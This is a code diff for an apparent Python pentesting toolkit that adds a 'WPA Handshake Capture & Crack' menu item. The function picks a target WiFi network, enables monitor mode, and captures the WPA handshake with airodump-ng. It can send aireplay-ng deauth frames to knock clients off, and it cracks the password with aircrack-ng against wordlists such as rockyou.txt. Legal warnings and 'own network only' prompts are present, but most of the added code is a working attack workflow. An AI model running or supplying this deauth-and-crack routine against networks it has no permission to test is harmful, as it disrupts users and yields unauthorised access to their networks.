+        print(f"  {RED}No WiFi networks found. Is WiFi enabled?{RESET}\n")
+        return
+    connected = _wifi_connected_ssid()
+    connected_bssid = _wifi_connected_bssid()
+    for i, n in enumerate(nets):
+        sig = "??" if n["signal"] in ("", "?") else n["signal"]
+        enc = n["enc"] if n["enc"] not in ("", "--") else "Open"
+        color = GREEN if enc == "Open" else YELLOW
+        band = n.get("band", "?")
+        marker = ""
+        net_bssid = n["bssid"].lower() if n["bssid"] else ""
+        if connected_bssid and net_bssid == connected_bssid:
+            marker = f"  {c('<- CONNECTED', RED)}"
+        print(f"  {c(f'[{i + 1}]', CYAN)}  {c(n['ssid'][:28].ljust(28), color)}  ch {c(n['chan'], CYAN):>4}  {c(band, MAGENTA):>4}  {c(sig, CYAN):>5}  {c(enc, BLUE):>5}{marker}")
+    print()
+    if connected:
+        print(f"  {YELLOW}Tip: only your CONNECTED AP drops when monitor mode starts.{RESET}")
+        print(f"  {YELLOW}Pick a different network (or a different band) to stay online.{RESET}\n")
+    pick = input(f"  {c(f'Which network? (1-{len(nets)}) or [b] back {SYM_PROMPT} ', CYAN)}").strip().lower()
+    if pick == "b":
+        return
+    if not pick.isdigit() or not (1 <= int(pick) <= len(nets)):
+        print(f"  {RED}Invalid choice.{RESET}\n")
+        return
+    net = nets[int(pick) - 1]
+    wifi_legal_warning()
+    print(f"  {c('Target: ' + net['ssid'] + '  (' + net['bssid'] + ')', YELLOW)}")
+    if not _yes(f"Capture the WPA handshake for {net['ssid']} now", default=False):
+        print(f"  {YELLOW}Cancelled.{RESET}\n")
+        return
+    all_ifaces = _all_wifi_ifaces()
+    iface = _find_wifi_iface()
+    if not iface and all_ifaces:
+        iface = all_ifaces[0]
+    if not iface:
+        print(f"  {RED}No wireless interface found.{RESET}\n")
+        return
+    spare = None
+    if len(all_ifaces) > 1:
+        connected_iface = None
+        try:
+            r = subprocess.run(["iwgetid"], capture_output=True, text=True, timeout=10)
+            mm = re.search(r'^(\S+)\s+ESSID:', r.stdout, re.M)
+            if mm:
+                connected_iface = mm.group(1)
+        except Exception:
+            pass
+        for a in all_ifaces:
+            if a != connected_iface:
+                spare = a
+                break
+        if spare:
+            print(f"  {c(f'Using spare adapter {spare} for monitor mode - your connection on {connected_iface} stays up.', GREEN)}")
+            iface = spare
+    print(f"  {c(f'Wireless interface: {iface}', CYAN)}")
+    print(f"\n  {RED}{BOLD}{'=' * 62}{RESET}")
+    print(f"  {RED}{BOLD}  MONITOR MODE = INTERNET WILL DROP{RESET}")
+    print(f"  {RED}{'=' * 62}{RESET}")
+    print(f"  {YELLOW}  Putting {iface} into monitor mode disconnects your current WiFi{RESET}")
+    print(f"  {YELLOW}  connection for the duration of the capture.{RESET}")
+    print(f"  {YELLOW}  Your connection returns automatically once monitor mode is{RESET}")
+    print(f"  {YELLOW}  stopped (your saved network auto-reconnects).{RESET}")
+    print(f"  {RED}{'=' * 62}{RESET}\n")
+    if not _yes("Continue (your WiFi will briefly drop)", default=False):
+        print(f"  {YELLOW}Cancelled. Your connection is untouched.{RESET}\n")
+        return
+    print(f"  {c('Enabling monitor mode...', MAGENTA)}")
+    subprocess.run(["airmon-ng", "start", iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=60)
+    mon = None
+    iw_out = ""
+    try:
+        iw_out = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=10).stdout
+    except Exception:
+        pass
+    for cand in (f"{iface}mon", "mon0", iface):
+        if os.path.exists(f"/sys/class/net/{cand}") or f"Interface {cand}" in iw_out:
+            mon = cand
+            break
+    if not mon:
+        mon = input(f"  {c(f'Monitor interface name? {SYM_PROMPT} ', CYAN)}").strip() or iface
+    capbase = os.path.join("/tmp", f"darkie_cap_{int(time.time())}")
+    print(f"  {c('Capturing handshake from ' + net['ssid'] + ' (ch ' + net['chan'] + ')...', GREEN)}")
+    print(f"  {YELLOW}If no client connects, we can send a deauth to force a reconnect.{RESET}")
+    print(f"  {c('Press Enter to stop early, or wait 20s.', CYAN)}")
+    cmd = ["airodump-ng", "--bssid", net["bssid"], "-c", net["chan"], "-w", capbase, "--write-interval", "1", mon]
+    import select
+    captured = False
+    try:
+        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
+    except Exception as e:
+        print(f"  {RED}Failed to start airodump-ng: {e}{RESET}")
+        subprocess.run(["airmon-ng", "stop", mon], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return
+    try:
+        deadline = time.time() + 20
+        while time.time() < deadline:
+            rdy, _, _ = select.select([p.stdout], [], [], 1.0)
+            if p.stdout in rdy:
+                line = p.stdout.readline()
+                if line:
+                    out = line.rstrip("\r\n")
+                    if out.strip():
+                        print(f"  {c(out.strip()[:120], CYAN)}")
+                    if "handshake" in line.lower():
+                        captured = True
+                        break
+            if p.poll() is not None:
+                break
+    except KeyboardInterrupt:
+        pass
+    p.terminate()
+    try:
+        p.wait(timeout=5)
+    except Exception:
+        p.kill()
+    if not captured:
+        print(f"  {YELLOW}No handshake yet - a client must connect for the 4-way handshake.{RESET}")
+        if _yes(f"Send deauth frames to force {net['ssid']} clients to reconnect", default=False):
+            wifi_legal_warning()
+            if _yes(f"Confirm deauth on {net['ssid']} (own/permitted network only)", default=False):
+                print(f"  {c('Sending deauth frames...', MAGENTA)}")
+                subprocess.run(["aireplay-ng", "-0", "5", "-a", net["bssid"], mon],
+                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=60)
+                try:
+                    deadline = time.time() + 20
+                    while time.time() < deadline:
+                        rdy, _, _ = select.select([p.stdout], [], [], 1.0)
+                        if p.stdout in rdy:
+                            line = p.stdout.readline()
+                            if line and "handshake" in line.lower():
+                                captured = True
+                                break
+                        if p.poll() is not None:
+                            break
+                except KeyboardInterrupt:
+                    pass
+        else:
+            if _yes("Keep listening a bit longer", default=False):
+                try:
+                    deadline = time.time() + 20
+                    while time.time() < deadline:
+                        rdy, _, _ = select.select([p.stdout], [], [], 1.0)
+                        if p.stdout in rdy:
+                            line = p.stdout.readline()
+                            if line and "handshake" in line.lower():
+                                captured = True
+                                break
+                        if p.poll() is not None:
+                            break
+                except KeyboardInterrupt:
+                    pass
+    p.terminate()
+    try:
+        p.wait(timeout=5)
+    except Exception:
+        p.kill()
+    os.system("stty sane 2>/dev/null")
+    subprocess.run(["airmon-ng", "stop", mon], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    cap = None
+    try:
+        base = os.path.basename(capbase)
+        cands = [os.path.join("/tmp", f) for f in os.listdir("/tmp")
+                 if f.startswith(base) and f.endswith(".cap")]
+        if cands:
+            cap = max(cands, key=os.path.getmtime)
+    except Exception:
+        pass
+    if not cap or not os.path.exists(cap) or os.path.getsize(cap) == 0:
+        print(f"  {RED}No capture saved. The interface may need monitor mode enabled first.{RESET}\n")
+        return
+    vr = subprocess.run(["aircrack-ng", cap], capture_output=True, text=True)
+    if not captured and "handshake" not in vr.stdout.lower():
+        print(f"  {RED}No valid WPA handshake in the capture.{RESET}")
+        print(f"  {YELLOW}Try again with better signal or wait for a client to connect.{RESET}\n")
+        return
+    print(f"  {GREEN}{SYM_CHECK} Handshake captured!{RESET}")
+    default_wl = next((w for w in (os.path.expanduser("~/.darkie-tools/wordlist.txt"),
+                                   "/usr/share/wordlists/rockyou.txt",
+                                   "/usr/share/wordlists/fasttrack.txt",
+                                   "/usr/share/john/password.lst") if os.path.exists(w)), "")
+    if default_wl:
+        print(f"  {c(f'Auto-using wordlist: {default_wl}', MAGENTA)}")
+        wl = default_wl
+    else:
+        print(f"  {YELLOW}No wordlist found. Place one at ~/.darkie-tools/wordlist.txt or type its path.{RESET}")
+        while True:
+            wl = input(f"  {c(f'Wordlist path {SYM_PROMPT} ', CYAN)}").strip()
+            if not wl:
+                print(f"  {RED}No wordlist given.{RESET}\n")
+                return
+            if not os.path.exists(wl):
+                print(f"  {YELLOW}File not found: {wl}{RESET}")
+                continue
+            break
+    print(f"  {c(f'Running aircrack-ng against {os.path.basename(wl)} ...', MAGENTA)}")
+    cr = subprocess.run(["aircrack-ng", "-b", net["bssid"], "-w", wl, cap], capture_output=True, text=True, timeout=3600)
+    out = cr.stdout + cr.stderr
+    m = re.search(r"KEY FOUND!\s*\[\s*([^\]\r\n]+)\s*\]", out)
+    if m:
+        pw = m.group(1).strip()
+        print(f"\n  {GREEN}{BOLD}{SYM_CHECK} PASSWORD FOUND: {c(pw, GREEN)}{RESET}")
+        print(f"  {c('Network: ' + net['ssid'] + '  (' + net['bssid'] + ')', CYAN)}")
+        add_log_alert("INFO", "WiFi", f"Handshake cracked for {net['ssid']}")
+    else:
+        print(f"  {RED}Password not found in this wordlist.{RESET}")
+        print(f"  {YELLOW}Try a larger wordlist (e.g. rockyou.txt) or a rules-based attack.{RESET}")
+    print()
+
+
 def menu_wifi():
     _menu_loop("wifi", "WiFi & Wireless", [
         ("1", "WiFi Network Scanner", wifi_scan),
         ("2", "WiFi Security Audit", wifi_audit),
+        ("3", "WPA Handshake Capture & Crack", wifi_password_audit),
         ("b", "Back to main menu", None),
     ], MAGENTA)
 
